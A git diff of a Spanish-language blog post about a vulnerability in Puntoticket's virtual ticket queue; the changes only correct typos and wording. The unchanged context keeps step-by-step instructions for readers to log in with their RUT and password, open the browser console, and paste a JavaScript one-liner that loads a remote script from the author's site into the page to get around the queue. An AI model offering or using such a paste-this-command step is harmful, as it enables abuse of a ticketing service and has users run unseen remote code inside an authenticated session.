@@ -12,7 +12,7 @@ layout: layouts/post.njk
 
 Intenté contactar a Puntoticket hace algunos días, pero no recibí ninguna respuesta. La información contenida en este post tiene solo fines educativos y ha sido recolectada utilizando información de público acceso.
 
-El código fuente se puede encontrar [aquí](https://github.com/juancri/Puntoticket-vulnerabilidad-fila-virtual) y es provisto sin ningún tipo de garantía bajo los términos de la [licencia MIT](https://es.wikipedia.org/wiki/Licencia_MIT). Use bajo su propio riesgo.
+El código fuente se puede encontrar [aquí](https://github.com/juancri/Puntoticket-vulnerabilidad-fila-virtual) y es provisto sin ningún tipo de garantía bajo los términos de la [licencia MIT](https://es.wikipedia.org/wiki/Licencia_MIT). Usa bajo tu propio riesgo.
 
 Por el momento, el código filra las localidades que no tienen asientos numerados. La compra de asientos numerados requiere más investigación.
 
@@ -32,9 +32,9 @@ Si no tienes tiempo para leer el post completo, estos son los pasos a seguir par
 (function(d){const s=d.createElement("script");s.src="//juancri.com/malaqueue/run.min.js";d.head.appendChild(s)})(document)
 ```
 
-2. Ingres a <a href="https://www.puntoticket.com/" target="_blank">puntoticket.com</a> con tu RUT y contraseña
+2. Ingresa a <a href="https://www.puntoticket.com/" target="_blank">puntoticket.com</a> con tu RUT y contraseña
 3. En la pestaña donde tengas abierto Puntoticket, presiona la techa **F12** o haz click derecho y selecciona la opción *"Inspect"* o *"Inspeccionar elemento"*
-4. Selecciona la sección *"Console"* o *"Consola"*
+4. Selecciona la pestaña *"Console"* o *"Consola"*
 5. Pega el código en la ventana
 6. Sigue las instrucciones en pantalla
 
